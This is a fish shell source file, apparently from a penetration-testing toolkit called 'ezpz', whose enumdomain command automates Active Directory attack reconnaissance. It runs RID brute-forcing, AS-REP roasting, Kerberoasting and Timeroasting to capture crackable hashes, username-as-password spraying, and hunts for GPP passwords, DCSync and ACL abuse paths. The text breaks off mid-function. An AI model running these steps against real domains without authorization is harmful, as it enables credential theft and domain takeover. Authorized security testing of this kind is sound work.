# Resolve a target IP/hostname to the DC record advertised by a previous
# `ezpz adscan` run. Searches *_etchosts.txt in the current directory first,
# then /etc/hosts. Prints "IP<TAB>FQDN<TAB>DOMAIN" for every match.
function __ezpz_enumdomain_resolve --argument-names target
    set -l sources
    set -a sources (find . -maxdepth 1 -name "*_etchosts.txt" -type f 2>/dev/null)
    test -r /etc/hosts; and set -a sources /etc/hosts
    test (count $sources) -gt 0; or return

    awk -v target="$target" '
        BEGIN { t = tolower(target) }
        /^[[:space:]]*#/ { next }
        NF < 2 { next }
        {
            hit = (tolower($1) == t)
            if (!hit) {
                for (i = 2; i <= NF; i++) {
                    if (tolower($i) == t) { hit = 1; break }
                }
            }
            if (hit && $2 ~ /\./) {
                n = split($2, labels, ".")
                domain = labels[2]
                for (j = 3; j <= n; j++) domain = domain "." labels[j]
                print $1 "\t" $2 "\t" domain
            }
        }
    ' $sources 2>/dev/null | sort -u
end

function __ezpz_acl_members --argument-names name
    set -l auth $argv[2..-1]
    test -n "$name"; or return
    # Avoid building LDAP filters from names with filter metacharacters.
    string match -qr '[*()]' -- $name; and return

    set -l dn_out (timeout 30 nxc ldap $auth --query "(sAMAccountName=$name)" distinguishedName 2>/dev/null)
    set -l dn (printf '%s\n' $dn_out | sed -nE 's/.*Response for object: (.*)$/\1/p' | head -1)
    test -n "$dn"; or return

    set -l mem_out (timeout 30 nxc ldap $auth --query "(memberOf:1.2.840.113556.1.4.1941:=$dn)" sAMAccountName 2>/dev/null)
    set -l members (printf '%s\n' $mem_out | sed -nE 's/.*sAMAccountName[[:space:]]+([^[:space:]]+).*/\1/p' | sort -u)
    if test -n "$members"
        string join ', ' $members
    end
end

function __ezpz_acl_scan_target --argument-names label target_dn
    set -l auth $argv[3..-1]
    set -l tmp (mktemp)
    ezpz_spin_capture $tmp timeout 60 nxc ldap $auth -M daclread -o TARGET_DN="$target_dn" ACTION=read
    set -l rc $status
    if test $rc -eq 124
        rm -f $tmp
        ezpz_warn "Timeout while reading ACLs for $label" >&2
        return
    end

    set -l hits (sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' $tmp | awk '
    function trim(s) {
        gsub(/^[ \t]+|[ \t]+$/, "", s)
        return s
    }
    function flush(   key, name, marker, right) {
        if (!inace || ace !~ /ACCESS_ALLOWED/) return
        if (mask == "") return

        if (mask ~ /ControlAccess/) {
            if (obj ~ /^UNKNOWN/) {
                right = obj
            } else {
                right = obj
                sub(/ \(.*/, "", right)
            }
            if (right == "") right = "ControlAccess"
        } else if (mask ~ /GenericAll|FullControl/) {
            right = "GenericAll (implies Reanimate-Tombstones)"
        } else if (mask ~ /WriteDACL/) {
            right = "WriteDACL (can grant Reanimate-Tombstones)"
        } else if (mask ~ /WriteOwner/) {
            right = "WriteOwner (can grant Reanimate-Tombstones)"
        } else if (mask ~ /GenericWrite/) {
            right = "GenericWrite (review for Reanimate-Tombstones)"
        } else if (mask ~ /AllExtendedRights/) {
            right = "AllExtendedRights (implies Reanimate-Tombstones)"
        } else {
            return
        }

        name = trust
        sub(/ \(S-.*/, "", name)
        name = trim(name)

        if (tolower(name) in hide) return
        if (index(toupper(name), "BUILTIN") == 1 && right !~ /Reanimate|UNKNOWN/) return
        if (name == "UNKNOWN" && right !~ /Reanimate|UNKNOWN/) return

        key = tolower(right)
        if (mask ~ /ControlAccess/ && (key in skip)) return

        # Broad groups are expected to have a few default control-access
        # rights; only surface them for the non-BloodHound extended rights.
        if (mask ~ /ControlAccess/ && key !~ /reanimate-tombstones|ds-replication-manage-topology|ds-replication-synchronize|migrate-sid-history|unknown/) {
            if (name ~ /^(Everyone|Authenticated Users|Domain Users|Domain Computers)$/) return
        }

        marker = ""
        if (flags ~ /INHERITED_ACE/) marker = " [inherited]"
        print right "|" name "|" marker
    }
    BEGIN {
        split("Administrators|Domain Admins|Enterprise Admins|Schema Admins|SYSTEM|Local System|Domain Controllers|Enterprise Domain Controllers|Key Admins|Enterprise Key Admins|Cloneable Domain Controllers|Account Operators|Server Operators|Backup Operators|Print Operators|Principal Self|Creator Owner|Creator Group|OWNER RIGHTS", hide_list, "|")
        for (i in hide_list) hide[tolower(hide_list[i])] = 1

        # Rights already modeled by BloodHound (or default password bits).
        split("User-Force-Change-Password|DS-Replication-Get-Changes|DS-Replication-Get-Changes-All|WriteMembers|User-Change-Password|Enable-Per-User-Reversibly-Encrypted-Password|Unexpire-Password|Update-Password-Not-Required-Bit", skip_list, "|")
        for (i in skip_list) skip[tolower(skip_list[i])] = 1
    }
    /^ACE\[[0-9]+\] info/ {
        flush()
        inace = 1
        ace = mask = flags = obj = trust = ""
        next
    }
    inace && /^[[:space:]]*[^:]+[[:space:]]*:/ {
        line = $0
        sub(/^[[:space:]]+/, "", line)
        pos = index(line, ":")
        if (!pos) next
        key = trim(substr(line, 1, pos - 1))
        val = trim(substr(line, pos + 1))
        if (key == "ACE Type") ace = val
        else if (key == "Access mask") mask = val
        else if (key == "ACE flags") flags = val
        else if (key == "Object type (GUID)") obj = val
        else if (key == "Trustee (SID)") trust = val
    }
    END { flush() }')
    rm -f $tmp

    test -n "$hits"; or return

    echo "  $label"
    for hit in $hits
        set -l parts (string split '|' -- $hit)
        set -l right $parts[1]
        set -l trustee $parts[2]
        set -l marker $parts[3]
        set -l members
        if test "$trustee" != UNKNOWN
            set members (__ezpz_acl_members "$trustee" $auth)
        end
        if test -n "$members"
            printf '    %s : %s (members: %s)%s\n' "$right" "$trustee" "$members" "$marker"
        else
            printf '    %s : %s%s\n' "$right" "$trustee" "$marker"
        end
    end
end

function _ezpz_enumdomain
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    ezpz_banner enumdomain

    # Usage message
    set usage "
Usage: ezpz enumdomain -t <target> -d <domain> -u <user> [options]

Enumerates an Active Directory domain for users, groups, policies, and misconfigurations.

  -t, --target        DC IP or hostname of the domain to enumerate (Required)
  -d, --domain        Domain of the supplied credentials (Required)
  -u, --user          Username for authentication (Required)
  -p, --password      Password for authentication
  -H, --hash          NTLM hash for pass-the-hash authentication
  -k, --kerb          Use Kerberos authentication (requires a valid TGT)
  --target-domain     Domain being enumerated (auto-detected from -t when omitted)
                      Detection uses *_etchosts.txt (from ezpz adscan) or /etc/hosts.
  -h, --help          Show this help message

Examples:
ezpz enumdomain -t 10.10.10.10 -u administrator -p password123 -d corp.local
ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local --target-domain dev.local
"

    # Check required tools
    set required_tools nxc GetNPUsers.py GetUserSPNs.py findDelegation.py
    for tool in $required_tools
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Parse arguments
    argparse 't/target=' 'u/user=' 'd/domain=' 'p/password=' 'H/hash=' 'k/kerb' 'target-domain=' 'h/help' -- $argv
    or begin
        ezpz_error "Invalid arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    # Check required arguments
    if not set -q _flag_target
        ezpz_error "Missing required argument: -t/--target"
        echo $usage
        return 1
    end

    if not set -q _flag_user
        ezpz_error "Missing required argument: -u/--user"
        echo $usage
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing required argument: -d/--domain"
        echo $usage
        return 1
    end

    # Set variables
    set target $_flag_target
    set user $_flag_user
    set domain $_flag_domain

    # Kerberos ccache principals are matched by bare username + -d domain.
    set -l bare_user $user
    if string match -q '*\\*' $bare_user
        set bare_user (string split '\\' $bare_user)[2]
    end
    if string match -q '*@*' $bare_user
        set bare_user (string split '@' $bare_user)[1]
    end

    # Resolve the target DC from a previous `ezpz adscan` run so the domain
    # being enumerated can differ from the domain of the supplied credentials.
    set -l lookup (__ezpz_enumdomain_resolve $target)
    set -l dc_ip (printf '%s\n' $lookup | awk -F'\t' 'NF >= 1 && $1 != "" { print $1; exit }')
    set -l dc_fqdn (printf '%s\n' $lookup | awk -F'\t' 'NF >= 2 && $2 ~ /\./ { print $2; exit }')
    set -l detected_domains (printf '%s\n' $lookup | awk -F'\t' 'NF >= 3 && $3 != "" { print $3 }' | sort -u)

    # Determine which domain is being enumerated (not the credential domain).
    set target_domain
    if set -q _flag_target_domain; and test -n "$_flag_target_domain"
        set target_domain $_flag_target_domain
    else if test (count $detected_domains) -eq 1
        set target_domain $detected_domains[1]
    else if test (count $detected_domains) -gt 1
        ezpz_warn "Ambiguous target domain for $target: "(string join ', ' $detected_domains)
        ezpz_warn "Falling back to credential domain '$domain'. Use --target-domain to override."
        set target_domain $domain
    else
        set target_domain $domain
    end

    # Fallbacks when the target was not found in a hosts file.
    test -n "$dc_ip"; or set dc_ip $target
    if test -z "$dc_fqdn"
        set dc_fqdn (awk -v target="$target" '$1 == target {max_len=0; fqdn=""; for(i=2; i<=NF; i++) {if(length($i) > max_len) {max_len=length($i); fqdn=$i}} print fqdn; exit}' /etc/hosts)
    end
    if test -z "$dc_fqdn" -a -n "$_flag_kerb"
        ezpz_warn "DC FQDN not found for $target. Kerberos may fail."
    end

    # File names always follow the domain being enumerated.
    set file_domain $target_domain

    # Domain comparisons are case-insensitive (AD DNS names are).
    set -l cross_domain true
    if test (string lower -- $target_domain) = (string lower -- $domain)
        set cross_domain false
    end

    # Build nxc authentication arguments. Kerberos with --use-kcache requires
    # the bare username plus -d; a domain-qualified -u breaks the ccache match.
    if set -q _flag_kerb
        set nxc_auth $dc_ip -u "$bare_user" -d "$domain"
    else
        set nxc_auth $dc_ip -u "$domain\\$user"
    end
    
    # Build impacket authentication arguments (domain/user format)
    set imp_auth "$domain/$bare_user"

    # Add authentication method
    if set -q _flag_password
        set -a nxc_auth -p "$_flag_password"
        set imp_auth "$imp_auth:$_flag_password"
    else if set -q _flag_hash
        set -a nxc_auth -H "$_flag_hash"
        set -a imp_auth -hashes ":$_flag_hash"
    end

    
    if set -q _flag_kerb
        ezpz_kerberos_check ldap; or return 1
        set -a nxc_auth -k
        set -a imp_auth -k
        if not set -q _flag_password; and not set -q _flag_hash
            set -a imp_auth -no-pass
        end
        if set -q KRB5CCNAME
            set -a nxc_auth --use-kcache
            ezpz_cmd "Using KRB5CCNAME at $KRB5CCNAME"
        end
        
               
        if test -n "$dc_fqdn"
            # Change IP to FQDN
            set nxc_auth[1] $dc_fqdn
            set -a imp_auth -dc-host $dc_fqdn
            # Create IP-only version for commands that require IP (like --dc-list)
            set nxc_auth_ip $nxc_auth
            set nxc_auth_ip[1] $dc_ip
        end
            
        
        # Time synchronization for Kerberos
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing clock with DC for Kerberos authentication..."
            sudo ntpdate -u $dc_ip >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Add DC IP for impacket commands
    set -a imp_auth -dc-ip $dc_ip

    # Create temporary file for users
    set users_tmp (mktemp)
    trap 'rm -f "$users_tmp"' EXIT TERM

    # Fail fast on bad credentials. Otherwise every enumeration step retries
    # the same password and can lock the account (threshold is often 5).
    if set -q _flag_password; or set -q _flag_hash; or set -q _flag_kerb
        set preflight (nxc smb $nxc_auth 2>&1)
        if not string match -qr '\[\+\]' -- $preflight
            printf '%s\n' $preflight | grep -aE '\[-\]|STATUS_|ERROR' | tail -3
            ezpz_error "Authentication failed for $domain\\$user. Aborting."
            return 1
        end
    end

    ezpz_title "Starting user & group enumeration..."

    # User Enumeration - check if users file already exists
    set users_file "$file_domain"_users.txt
    set users_file_mini "$file_domain"_users-mini.txt
    if test -f $users_file
        ezpz_info "Users file $users_file already exists. Skipping user enumeration."
        cat $users_file
        cp $users_file $users_tmp
    else
        # Create temporary file for users display
        set users_temp (mktemp)
        
        # Prioritize --rid-brute over --users
        echo
        ezpz_header "Enumerating users with RID Bruteforcing"
        ezpz_cmd "nxc smb $nxc_auth --rid-brute 10000"
        ezpz_spin nxc smb $nxc_auth --rid-brute 10000 | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
        
        if test $pipestatus[1] -eq 124
            ezpz_warn "Operation timed out. Skipping."
        else if test -s $users_tmp
            cp $users_tmp $users_file
            ezpz_info "Saving enumerated users to $users_file"
        else
            ezpz_warn "No users found with --rid-brute. Trying --users as fallback..."
            if test -f $users_file_mini
                ezpz_info "Users file $users_file already exists. Skipping user enumeration."
                cat $users_file_mini
                cp $users_file_mini $users_tmp
            else    
                # Fallback to --users
                echo
                ezpz_header "Enumerating users (fallback)"
                ezpz_cmd "nxc smb $nxc_auth --users"
                ezpz_spin nxc smb $nxc_auth --users | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
                
                if test $pipestatus[1] -eq 124
                    ezpz_warn "Operation timed out. Skipping."
                else if test -s $users_temp
                    # Extract just usernames and save to file with -mini suffix
                    cat $users_temp | awk '{print $1}' > $users_tmp
                    cp $users_tmp $users_file_mini
                    ezpz_info "Saving enumerated users to $users_file_mini"
                    set users_file $users_file_mini
                else
                    ezpz_error "No users found with --users fallback."
                end
            end
        end
        
        # Cleanup temp file
        rm -f $users_temp
    end

    echo
    ezpz_header "Enumerating groups"
    ezpz_cmd "nxc ldap $nxc_auth --groups"
    set -l groups_tmp (mktemp)
    ezpz_spin_capture $groups_tmp nxc ldap $nxc_auth --groups
    set groups_out (cat $groups_tmp)
    rm -f $groups_tmp

    set -l groups_rendered
    if string match -q '*membercount*' -- $groups_out
        # Older nxc output format
        set groups_rendered (printf '%s\n' $groups_out | grep -a 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -av 'membercount: 0' | sed "s/membercount:/-/g")
    else
        # nxc >= 1.5 renders an aligned table. Keep only Group and Members;
        # descriptions are noisy and are intentionally discarded here.
        set groups_rendered (printf '%s\n' $groups_out \
            | grep -avF -e '[*]' -e '[+]' -e '[-]' -e '[!]' \
            | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' \
            | awk '
                members_col == 0 && index($0, "-Members-") > 0 {
                    members_col = index($0, "-Members-")
                    desc_col = index($0, "-Description-")
                    printf "%-40s %s\n", "GROUP", "MEMBERS"
                    next
                }
                members_col > 0 {
                    group = substr($0, 1, members_col - 1)
                    members = substr($0, members_col, (desc_col > members_col ? desc_col - members_col : length($0)))
                    gsub(/^[ \t]+|[ \t]+$/, "", group)
                    gsub(/^[ \t]+|[ \t]+$/, "", members)
                    if (group != "" && members != "0") printf "%-40s %s\n", group, members
                }')
    end

    if test -n "$groups_rendered"
        printf '%s\n' $groups_rendered
    else
        printf '%s\n' "No groups found (access denied?)."
    end

    echo
    ezpz_header "Enumerating privileged users"
    ezpz_cmd "nxc ldap $nxc_auth --admin-count"
    set -l admins_out (ezpz_spin nxc ldap $nxc_auth --admin-count | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5)
    if test -n "$admins_out"
        printf '%s\n' $admins_out
    else
        printf '%s\n' "No privileged users found."
    end

    echo
    ezpz_header "Enumerating user descriptions"
    ezpz_cmd "nxc ldap $nxc_auth -M get-desc-users"
    set -l descriptions_out (ezpz_spin nxc ldap $nxc_auth -M get-desc-users | grep -a --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t)
    if test -n "$descriptions_out"
        printf '%s\n' $descriptions_out
    else
        printf '%s\n' "No user descriptions found."
    end

    echo
    ezpz_header "Enumerating user info fields"
    ezpz_cmd "nxc ldap $nxc_auth -M get-info-users"
    set -l info_tmp (mktemp)
    ezpz_spin_capture $info_tmp nxc ldap $nxc_auth -M get-info-users
    set -l info_lines (grep -avE '\[\*\]|\[\+\]|\[-\]' $info_tmp | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' | grep -aiE 'User:|Info:' | sort -u)
    if test -n "$info_lines"
        printf '%s\n' $info_lines
    else
        printf '%s\n' "No user info fields found."
    end
    rm -f $info_tmp

    echo
    ezpz_title "Looking for exploitable accounts..."

    echo
    ezpz_header "Searching for AS-REProastable accounts"
    set asrep_file "$file_domain"_asrep.hash
    if test "$cross_domain" = true; or set -q _flag_kerb
        if test -f $users_file
            ezpz_cmd "GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file"
            ezpz_spin GetNPUsers.py $target_domain/ -dc-ip $dc_ip -usersfile $users_file -no-pass -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
        else
            ezpz_warn "Users file $users_file not found. Skipping cross-domain AS-REP roasting with usersfile."
        end
    else
        ezpz_cmd "GetNPUsers.py $imp_auth -request -outputfile $asrep_file"
        ezpz_spin GetNPUsers.py $imp_auth -request -outputfile $asrep_file | grep -aiE "(No entries found|Error)"
    end

    if test -s $asrep_file
        cat $asrep_file
        ezpz_info "Saving hashes to $asrep_file"
    else
        rm -f $asrep_file
        printf '%s\n' "No AS-REP roastable accounts found."
    end

    echo
    ezpz_header "Searching for Kerberoastable accounts"
    set kerb_file "$file_domain"_kerb.hash
    if test "$cross_domain" = true
        ezpz_cmd "GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file"
        ezpz_spin GetUserSPNs.py $imp_auth -target-domain $target_domain -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
    else
        ezpz_cmd "GetUserSPNs.py $imp_auth -request -outputfile $kerb_file"
        ezpz_spin GetUserSPNs.py $imp_auth -request -outputfile $kerb_file | grep -aiE "(No entries found|Error)"
    end
    if test -s $kerb_file
        # Convert hashes to user:hash format and save to a temporary file
        set kerb_formatted (mktemp)
        cat $kerb_file | sed -E 's/\$krb5tgs\$23\$\*([^$]+)\$.*$/\1:&/' > $kerb_formatted
        cat $kerb_formatted
        mv $kerb_formatted $kerb_file
        ezpz_info "Saving hashes to $kerb_file"
    else
        rm -f $kerb_file
        printf '%s\n' "No Kerberoastable accounts found."
    end

    echo
    ezpz_header "Searching for Timeroastable accounts"
    set time_file "$file_domain"_time.hash
    ezpz_cmd "smb $nxc_auth -M timeroast"
    ezpz_spin nxc smb $nxc_auth -M timeroast | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5 | tee $time_file
    if test -s $time_file
        ezpz_info "Saving hashes to $time_file"
    else
        rm -f $time_file
        printf '%s\n' "No Timeroastable accounts found."
    end

    echo
    ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
    ezpz_cmd "nxc ldap $nxc_auth --password-not-required"
    set -l passwd_notreq_out (ezpz_spin nxc ldap $nxc_auth --password-not-required | grep --color=never -ao "User:.*")
    if test -n "$passwd_notreq_out"
        printf '%s\n' $passwd_notreq_out
    else
        printf '%s\n' "No accounts with the PASSWD_NOTREQD flag found."
    end

    echo
    ezpz_header "Enumerating Group Managed Service Accounts (gMSA)"
    ezpz_cmd "nxc ldap $nxc_auth --gmsa"
    set -l gmsa_tmp (mktemp)
    ezpz_spin_capture $gmsa_tmp timeout 60 nxc ldap $nxc_auth --gmsa
    set -l gmsa_rc $status
    set -l gmsa_out (grep -a --color=never -oE "Account:.*|PrincipalsAllowedToReadPassword:.*" $gmsa_tmp)
    if test $gmsa_rc -eq 124
        ezpz_warn "Operation timed out. Skipping."
    else if test -n "$gmsa_out"
        printf '%s\n' $gmsa_out
    else
        printf '%s\n' "No gMSA accounts found."
    end
    rm -f $gmsa_tmp

  
    if command -v pre2k >/dev/null 2>&1
        if test "$cross_domain" = true
            ezpz_warn "pre2k auth does not support cross-domain auth; skipping."
            ezpz_info "Run pre2k against the credential domain DC (e.g. -t 10.10.0.11 -d north.sevenkingdoms.local)."
        else
            echo
            ezpz_header "Searching for pre-Win2k compatible computer accounts"

            # Build pre2k auth command
            set pre2k_cmd pre2k auth -threads 100 -u "$bare_user" -d $domain -dc-ip $dc_ip

            # Add authentication method
            if set -q _flag_password
                set -a pre2k_cmd -p "$_flag_password"
            else if set -q _flag_hash
                set -a pre2k_cmd -hashes ":$_flag_hash"
            else if set -q _flag_kerb
                set -a pre2k_cmd -k
                if set -q KRB5CCNAME
                    set -a pre2k_cmd -no-pass
                end
            end

            ezpz_cmd "$pre2k_cmd"
            set -l pre2k_out (ezpz_spin $pre2k_cmd | grep -aioE "VALID CREDENTIALS: .*" --color=never)
            if test -n "$pre2k_out"
                printf '%s\n' $pre2k_out
            else
                printf '%s\n' "No pre-Win2k compatible computer accounts found."
            end
        end
    else
        ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
    end
  

    if command -v kerbrute >/dev/null 2>&1
        echo
        ezpz_header "Bruteforcing credentials with username as password"
        if test -s $users_tmp
            ezpz_cmd "kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass"
            set -l userpass_out (ezpz_spin kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass | grep -aoE "VALID LOGIN.*" | sed -E 's/\x1B\[[0-9;]*[A-Za-z]//g; s/^(VALID LOGIN( WITH ERROR)?):[[:space:]]*/\1: /')
            if test -n "$userpass_out"
                printf '%s\n' $userpass_out
            else
                printf '%s\n' "No username-as-password credentials found."
            end
        else
            ezpz_error "User list is empty. Run RID bruteforce first. Skipping."
        end
    else
        ezpz_warn "Kerbrute not found. Skipping username-as-password bruteforce."
    end

    echo
    ezpz_title "Looking for interesting domain configuration and services..."

    echo
    ezpz_header "Searching for PKI Enrollment Services (ADCS)"
    ezpz_cmd "nxc ldap $nxc_auth -M certipy-find"
    set -l adcs_tmp (mktemp)
    ezpz_spin_capture $adcs_tmp nxc ldap $nxc_auth -M certipy-find
    # Keep only the actionable ADCS data: CA identity and ESC findings.
    set -l adcs_info (__ezpz_adcs_parse < $adcs_tmp)
    set -l ca_name (printf '%s\n' $adcs_info | sed -n 's/^CANAME|//p' | head -1)
    set -l ca_dns (printf '%s\n' $adcs_info | sed -n 's/^CADNS|//p' | head -1)
    set -l adcs_escs (printf '%s\n' $adcs_info | grep -a '^ESC|' | sed 's/^ESC|//')
    if test -n "$ca_name"
        printf '%-34s : %s\n' "CA Name" "$ca_name"
        if test -n "$ca_dns"
            printf '%-34s : %s\n' "DNS Name" "$ca_dns"
        end
        if test -n "$adcs_escs"
            for finding in $adcs_escs
                set -l parts (string split '|' -- $finding)
                set -l esc $parts[1]
                set -l scope $parts[2]
                set -l object $parts[3]
                set -l desc $parts[4]
                printf '%-6s %s: %s — %s\n' "$esc" "$scope" "$object" "$desc"
            end
        else
            printf '%s\n' "No ESC findings."
        end
    else
        printf '%s\n' "No CA found in this domain."
    end
    rm -f $adcs_tmp

    echo
    ezpz_header "Searching for trust relationships"
    set -l trusts_out
    if set -q nxc_auth_ip
        ezpz_cmd "nxc ldap $nxc_auth_ip --dc-list"
        set trusts_out (ezpz_spin nxc ldap $nxc_auth_ip --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
    else
        ezpz_cmd "nxc ldap $nxc_auth --dc-list"
        set trusts_out (ezpz_spin nxc ldap $nxc_auth --dc-list | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5-)
    end
    if test -n "$trusts_out"
        printf '%s\n' $trusts_out
    else
        printf '%s\n' "No trust relationships found."
    end

    echo
    ezpz_header "Enumerating MachineAccountQuota (MAQ)"
    ezpz_cmd "nxc ldap $nxc_auth -M maq"
    set -l maq_out (ezpz_spin nxc ldap $nxc_auth -M maq | grep -aoE "MachineAccountQuota: .*" --color=never)
    if test -n "$maq_out"
        printf '%s\n' $maq_out
    else
        printf '%s\n' "No MachineAccountQuota data found."
    end

    echo
    ezpz_header "Enumerating delegation rights"
    set -l delegation_tmp (mktemp)
    if test "$cross_domain" = true
        ezpz_cmd "findDelegation.py $imp_auth -target-domain $target_domain"
        ezpz_spin_capture $delegation_tmp findDelegation.py $imp_auth -target-domain $target_domain
    else
        ezpz_cmd "findDelegation.py $imp_auth"
        ezpz_spin_capture $delegation_tmp findDelegation.py $imp_auth
    end
    set output (cat $delegation_tmp)
    rm -f $delegation_tmp
    set error_lines (printf '%s\n' $output | grep -aiE "(No entries found|Error)")
    set -l delegation_out
    if test -n "$error_lines"
        for line in $error_lines
            set -a delegation_out (string replace -r '^\[-\] ' '' -- $line)
        end
    else
        set delegation_out (printf '%s\n' $output | grep -a --color=never "\\S" | tail -n +2)
    end
    if test -n "$delegation_out"
        printf '%s\n' $delegation_out
    else
        printf '%s\n' "No delegation rights found."
    end

    echo
    ezpz_header "Enumerating DCSync rights"
    # Build TARGET_DN dynamically based on the enumerated domain, not the
    # credential domain (cross-domain trusts would otherwise read the wrong DN).
    set domain_parts (string split '.' $target_domain)
    set target_dn ""
    for part in $domain_parts
        if test -n "$target_dn"
            set target_dn "$target_dn,DC=$part"
        else
            set target_dn "DC=$part"
        end
    end
    ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=\"$target_dn\" ACTION=read RIGHTS=DCSync"
    set -l dcsync_out (ezpz_spin nxc ldap $nxc_auth -M daclread -o TARGET_DN="$target_dn" ACTION=read RIGHTS=DCSync | grep -a "Trustee" | cut -d ":" -f 2 | sed 's/^[[:space:]]*//')
    if test -n "$dcsync_out"
        printf '%s\n' $dcsync_out
    else
        printf '%s\n' "No DCSync rights found."
    end

    # Deliberately narrow: BloodHound already models the common edges
    # (ForceChangePassword, DCSync, AddMember, GenericAll, etc.). Surface only
    # extended rights it does not model, plus GenericAll/Write as an implied
    # Reanimate-Tombstones path.
    echo
    ezpz_header "Enumerating non-standard ACL rights"
    ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=<root|OU|AdminSDHolder|Deleted Objects> ACTION=read"

    # Collect OUs so an ACL granted on a container (and inherited by its
    # children) is not missed; root/AdminSDHolder/Deleted Objects are always
    # included.
    set -l ou_tmp (mktemp)
    ezpz_spin_capture $ou_tmp timeout 60 nxc ldap $nxc_auth --query "(objectClass=organizationalUnit)" distinguishedName
    set -l ou_dns (sed -E 's/^([^[:space:]]+[[:space:]]+){4}//' $ou_tmp \
        | sed -nE 's/^distinguishedName[[:space:]]+(.+)$/\1/p' \
        | sort -u)
    rm -f $ou_tmp

    set -l acl_targets "Domain root|$target_dn" \
        "AdminSDHolder|CN=AdminSDHolder,CN=System,$target_dn" \
        "Deleted Objects|CN=Deleted Objects,$target_dn"
    for ou in $ou_dns
        set -a acl_targets "$ou|$ou"
    end

    set -l acl_hits 0
    for entry in $acl_targets
        set -l parts (string split '|' -- $entry)
        set -l label $parts[1]
        set -l dn $parts[2]
        set -l out (__ezpz_acl_scan_target "$label" "$dn" $nxc_auth)
        if test -n "$out"
            printf '%s\n' $out
            set acl_hits 1
        end
    end
    if test $acl_hits -eq 0
        printf '%s\n' "No non-standard extended rights found."
    end

    echo
    ezpz_header "Searching for credentials in Group Policy Preferences (GPP)"
    ezpz_cmd "nxc smb $nxc_auth -M gpp_password -M gpp_autologin"
    set -l gpp_out
    set -a gpp_out (ezpz_spin nxc smb $nxc_auth -M gpp_password | grep -aioE "Found credentials .*|userName: .*|Password: .*" --color=never)
    set -a gpp_out (ezpz_spin nxc smb $nxc_auth -M gpp_autologin | grep -aioE "Found credentials .*|Usernames: .*|Passwords: .*" --color=never)
    if test -n "$gpp_out"
        printf '%s\n' $gpp_out
    else
        printf '%s\n' "No GPP credentials found."
    end

    # Domain GPO user-rights assignments (GptTmpl.inf). This is a potential
    # map: the module does not evaluate GPO links/filters or local policy on
    # member servers, so treat it as leads, not effective privileges.
    echo
    ezpz_header "Enumerating GPO-delegated user rights"
    ezpz_cmd "nxc smb $nxc_auth -M gpp_privileges"
    set -l gpp_priv_tmp (mktemp)
    ezpz_spin_capture $gpp_priv_tmp timeout 120 nxc smb $nxc_auth -M gpp_privileges
    set -l gpp_priv_rc $status
    set -l gpp_priv_output (grep -avE '\[\*\]|\[-\]' $gpp_priv_tmp \
        | sed -E 's/^([^[:space:]]+[[:space:]]+){4}//; s/^\[[!+*?-]\][[:space:]]*//' \
        | awk '
        BEGIN {
            n = split("Administrators,Users,Guests,Power Users,Account Operators,Server Operators,Print Operators,Backup Operators,Replicators,Domain Admins,Enterprise Admins,Schema Admins,Domain Controllers,Enterprise Domain Controllers,Read-only Domain Controllers,Enterprise Read-only Domain Controllers,Cloneable Domain Controllers,Cert Publishers,Group Policy Creator Owners,Protected Users,Key Admins,Enterprise Key Admins,Domain Users,Domain Guests,Domain Computers,DnsAdmins,DnsUpdateProxy,RAS and IAS Servers,Authenticated Users,Everyone,NT Authority,Local System,System,Local Service,Network Service,Pre-Windows 2000 Compatible Access,Remote Desktop Users,Network Configuration Operators,Performance Monitor Users,Performance Log Users,Windows Authorization Access Group,Terminal Server License Servers,Distributed COM Users,Cryptographic Operators,Event Log Readers,Certificate Service DCOM Access,RDS Remote Access Servers,RDS Endpoint Servers,RDS Management Servers,Hyper-V Administrators,Access Control Assistance Operators,Remote Management Users,Incoming Forest Trust Builders,Storage Replica Administrators,Allowed RODC Password Replication Group,Denied RODC Password Replication Group,Creator Owner,Creator Group,Owner Rights,Self,Restricted Code,Terminal Server Users,Remote Interactive Logon,This Organization,IUSR,Proxy,Dialup,Network,Batch,Interactive,Service,Anonymous Logon,Window Manager Group,All Services,NTLM Authentication,SChannel Authentication,Digest Authentication", names, ",")
            for (i = 1; i <= n; i++) builtin[tolower(names[i])] = 1
        }
        /^No GptTmpl/ {
            print $0
            found = 1
            next
        }
        /^Found .*GptTmpl\.inf/ {
            gpo = $0
            sub(/GptTmpl\.inf:.*/, "GptTmpl.inf", gpo)
            next
        }
        /^Se[A-Za-z0-9]+(Privilege|Right):/ {
            priv = $0
            sub(/: .*/, "", priv)
            rest = $0
            sub(/^[^:]+: /, "", rest)

